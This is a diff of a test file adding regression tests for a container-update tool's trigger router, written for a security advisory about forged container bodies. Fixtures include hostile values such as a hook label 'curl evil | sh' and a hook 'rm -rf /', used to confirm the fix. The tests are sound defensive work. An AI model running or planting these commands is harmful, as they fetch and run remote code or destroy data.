@@ -59,7 +59,7 @@ import {
 } from '../triggers/notification-skips.js';
 import * as component from './component.js';
 import * as triggerRouter from './trigger.js';
-import { runTrigger } from './trigger.js';
+import { runTrigger, runTriggerFromController } from './trigger.js';
 import { registerTriggerSkipRoutes } from './trigger-skips.js';
 
 const componentInit = vi.mocked(component.init);
@@ -1679,6 +1679,300 @@ describe('Trigger Router', () => {
 
       expect(res.status).toHaveBeenCalledWith(200);
       expect(trigger.trigger).toHaveBeenCalledTimes(1);
+    });
+  });
+
+  // GHSA-46pm-mm9q-xv3c (WUD): the route body used to be the container the
+  // trigger ran on. Store-bound triggers must only take the id from it.
+  describe('forged container bodies', () => {
+    const STORE_BOUND_TYPES = ['command', 'githubdispatch', 'gitlabpipeline'];
+
+    function forgedBody(extra: Record<string, unknown> = {}) {
+      return {
+        id: 'c1',
+        name: 'web',
+        image: { name: 'attacker/evil', tag: { value: 'pwned' } },
+        labels: { 'dd.action.include': 'command.deploy', 'dd.hook.pre': 'curl evil | sh' },
+        result: { tag: 'pwned', digest: 'sha256:forged' },
+        ...extra,
+      };
+    }
+
+    function storedContainer(overrides: Record<string, unknown> = {}) {
+      return {
+        id: 'c1',
+        name: 'web',
+        image: { name: 'library/nginx', tag: { value: '1.27' } },
+        labels: { 'dd.watch': 'true' },
+        result: { tag: '1.28' },
+        updateKind: { kind: 'tag', semverDiff: 'minor' },
+        ...overrides,
+      };
+    }
+
+    function registerTrigger(type: string) {
+      const trigger = { type, name: 'ci', trigger: vi.fn().mockResolvedValue(undefined) };
+      registry.getState.mockReturnValue({ trigger: { [`${type}.ci`]: trigger } });
+      return trigger;
+    }
+
+    test.each(STORE_BOUND_TYPES)(
+      'a local %s trigger runs on the stored container, not the forged body',
+      async (type) => {
+        const trigger = registerTrigger(type);
+        const stored = storedContainer();
+        mockGetContainer.mockReturnValue(stored);
+        const res = createMockResponse();
+
+        await runTrigger({ params: { type, name: 'ci' }, body: forgedBody() }, res);
+
+        expect(mockGetContainer).toHaveBeenCalledWith('c1');
+        expect(trigger.trigger).toHaveBeenCalledTimes(1);
+        const ran = trigger.trigger.mock.calls[0][0];
+        expect(ran).toBe(stored);
+        expect(ran.image.name).toBe('library/nginx');
+        expect(ran.labels['dd.hook.pre']).toBeUndefined();
+        expect(ran.result.tag).toBe('1.28');
+        expect(res.status).toHaveBeenCalledWith(200);
+      },
+    );
+
+    test.each(STORE_BOUND_TYPES)(
+      'a local %s trigger returns 404 for an id the store lacks',
+      async (type) => {
+        const trigger = registerTrigger(type);
+        const res = createMockResponse();
+
+        await runTrigger({ params: { type, name: 'ci' }, body: forgedBody() }, res);
+
+        expect(res.status).toHaveBeenCalledWith(404);
+        expect(res.json).toHaveBeenCalledWith({ error: 'Container not found' });
+        expect(trigger.trigger).not.toHaveBeenCalled();
+      },
+    );
+
+    test('a local store-bound trigger refuses a stored container owned by an agent', async () => {
+      const trigger = registerTrigger('command');
+      mockGetContainer.mockReturnValue(storedContainer({ agent: 'edge1' }));
+      const res = createMockResponse();
+
+      await runTrigger({ params: { type: 'command', name: 'ci' }, body: { id: 'c1' } }, res);
+
+      expect(res.status).toHaveBeenCalledWith(400);
+      expect(res.json).toHaveBeenCalledWith({
+        error: 'Cannot execute local trigger command.ci on remote container edge1.c1',
+      });
+      expect(trigger.trigger).not.toHaveBeenCalled();
+    });
+
+    test('the rollback guard reads the stored name, not the body name', async () => {
+      const trigger = registerTrigger('command');
+      mockGetContainer.mockReturnValue(storedContainer({ name: 'web-old-1234567890' }));
+      const res = createMockResponse();
+
+      await runTrigger(
+        { params: { type: 'command', name: 'ci' }, body: { id: 'c1', name: 'web' } },
+        res,
+      );
+
+      expect(res.status).toHaveBeenCalledWith(409);
+      expect(trigger.trigger).not.toHaveBeenCalled();
+    });
+
+    test('a notification test-fire strips labels and unknown keys, nested ones too', async () => {
+      const trigger = registerTrigger('slack');
+      const res = createMockResponse();
+
+      await runTrigger(
+        {
+          params: { type: 'slack', name: 'ci' },
+          body: forgedBody({
+            notificationTriggerInclude: 'slack.ci',
+            hooks: { pre: 'rm -rf /' },
+            image: { name: 'test/image', tag: { value: 'latest', extra: 'x' }, env: ['A=1'] },
+            result: { tag: 'latest', releaseNotes: { body: 'x' } },
+          }),
+        },
+        res,
+      );
+
+      expect(mockGetContainer).not.toHaveBeenCalled();
+      expect(trigger.trigger).toHaveBeenCalledWith({
+        id: 'c1',
+        name: 'web',
+        image: { name: 'test/image', tag: { value: 'latest' } },
+        result: { tag: 'latest' },
+        updateKind: {
+          kind: 'unknown',
+          localValue: undefined,
+          remoteValue: undefined,
+          semverDiff: 'unknown',
+        },
+      });
+      expect(res.status).toHaveBeenCalledWith(200);
+    });
+
+    test.each([
+      ['an oversized string', { id: 'c1', name: 'x'.repeat(2049) }],
+      ['a wrongly typed nested field', { id: 'c1', image: { tag: { semver: 'yes' } } }],
+      ['an overlong id', { id: 'c'.repeat(257) }],
+    ])('a notification test-fire with %s is refused with 400', async (_label, body) => {
+      const trigger = registerTrigger('slack');
+      const res = createMockResponse();
+
+      await runTrigger({ params: { type: 'slack', name: 'ci' }, body }, res);
+
+      expect(res.status).toHaveBeenCalledWith(400);
+      expect(res.json).toHaveBeenCalledWith({ error: 'Invalid trigger request body' });
+      expect(trigger.trigger).not.toHaveBeenCalled();
+    });
+
+    test('the agent-side entry point runs controller notification payloads as sent', async () => {
+      const trigger = registerTrigger('slack');
+      const body = forgedBody();
+      const res = createMockResponse();
+
+      await runTriggerFromController({ params: { type: 'slack', name: 'ci' }, body }, res);
+
+      expect(trigger.trigger).toHaveBeenCalledWith(
+        expect.objectContaining({ labels: body.labels, image: body.image }),
+      );
+      expect(res.status).toHaveBeenCalledWith(200);
+    });
+
+    test('the agent-side entry point still re-reads store-bound containers', async () => {
+      const trigger = registerTrigger('command');
+      const stored = storedContainer();
+      mockGetContainer.mockReturnValue(stored);
+      const res = createMockResponse();
+
+      await runTriggerFromController(
+        { params: { type: 'command', name: 'ci' }, body: forgedBody() },
+        res,
+      );
+
+      expect(trigger.trigger.mock.calls[0][0]).toBe(stored);
+    });
+
+    describe('agent route', () => {
+      function mockAgent() {
+        const client = { runRemoteTrigger: vi.fn().mockResolvedValue(undefined) };
+        agent.getAgent.mockReturnValue(client);
+        return client;
+      }
+
+      test.each(STORE_BOUND_TYPES)(
+        'a remote %s trigger forwards the stored container, not the forged body',
+        async (type) => {
+          const client = mockAgent();
+          const stored = storedContainer({ agent: 'edge1' });
+          mockGetContainer.mockReturnValue(stored);
+          const res = createMockResponse();
+
+          await getRemoteTriggerHandler()(
+            {
+              params: { agent: 'edge1', type, name: 'ci' },
+              body: forgedBody({ operationId: 'op-1' }),
+            },
+            res,
+          );
+
+          expect(client.runRemoteTrigger).toHaveBeenCalledWith(stored, type, 'ci', {
+            operationId: 'op-1',
+          });
+          expect(res.status).toHaveBeenCalledWith(200);
+        },
+      );
+
+      test.each(STORE_BOUND_TYPES)(
+        'a remote %s trigger returns 404 for an id the store lacks',
+        async (type) => {
+          const client = mockAgent();
+          const res = createMockResponse();
+
+          await getRemoteTriggerHandler()(
+            { params: { agent: 'edge1', type, name: 'ci' }, body: forgedBody() },
+            res,
+          );
+
+          expect(res.status).toHaveBeenCalledWith(404);
+          expect(res.json).toHaveBeenCalledWith({ error: 'Container not found' });
+          expect(client.runRemoteTrigger).not.toHaveBeenCalled();
+        },
+      );
+
+      test('a remote store-bound trigger refuses a container another agent owns', async () => {
+        const client = mockAgent();
+        mockGetContainer.mockReturnValue(storedContainer({ agent: 'edge2' }));
+        const res = createMockResponse();
+
+        await getRemoteTriggerHandler()(
+          { params: { agent: 'edge1', type: 'command', name: 'ci' }, body: { id: 'c1' } },
+          res,
+        );
+
+        expect(res.status).toHaveBeenCalledWith(409);
+        expect(res.json).toHaveBeenCalledWith({
+          error: 'Route agent edge1 does not own container edge2.c1',
+        });
+        expect(client.runRemoteTrigger).not.toHaveBeenCalled();
+      });
+
+      test('a remote store-bound trigger checks the stored name for rollback', async () => {
+        const client = mockAgent();
+        mockGetContainer.mockReturnValue(
+          storedContainer({ agent: 'edge1', name: 'web-old-1234567890' }),
+        );
+        const res = createMockResponse();
+
+        await getRemoteTriggerHandler()(
+          { params: { agent: 'edge1', type: 'command', name: 'ci' }, body: { id: 'c1' } },
+          res,
+        );
+
+        expect(res.status).toHaveBeenCalledWith(409);
+        expect(client.runRemoteTrigger).not.toHaveBeenCalled();
+      });
+
+      test('a remote notification test-fire forwards the stripped simulation', async () => {
+        const client = mockAgent();
+        const res = createMockResponse();
+
+        await getRemoteTriggerHandler()(
+          { params: { agent: 'edge1', type: 'slack', name: 'ci' }, body: forgedBody() },
+          res,
+        );
+
+        expect(client.runRemoteTrigger).toHaveBeenCalledWith(
+          {
+            id: 'c1',
+            name: 'web',
+            image: { name: 'attacker/evil', tag: { value: 'pwned' } },
+            result: { tag: 'pwned', digest: 'sha256:forged' },
+          },
+          'slack',
+          'ci',
+          undefined,
+        );
+        expect(res.status).toHaveBeenCalledWith(200);
+      });
+
+      test('a remote notification test-fire with an invalid simulation is refused', async () => {
+        const client = mockAgent();
+        const res = createMockResponse();
+
+        await getRemoteTriggerHandler()(
+          {
+            params: { agent: 'edge1', type: 'slack', name: 'ci' },
+            body: { id: 'c1', updateAvailable: 'yes' },
+          },
+          res,
+        );
+
+        expect(res.status).toHaveBeenCalledWith(400);
+        expect(res.json).toHaveBeenCalledWith({ error: 'Invalid trigger request body' });
+        expect(client.runRemoteTrigger).not.toHaveBeenCalled();
+      });
     });
   });
 });
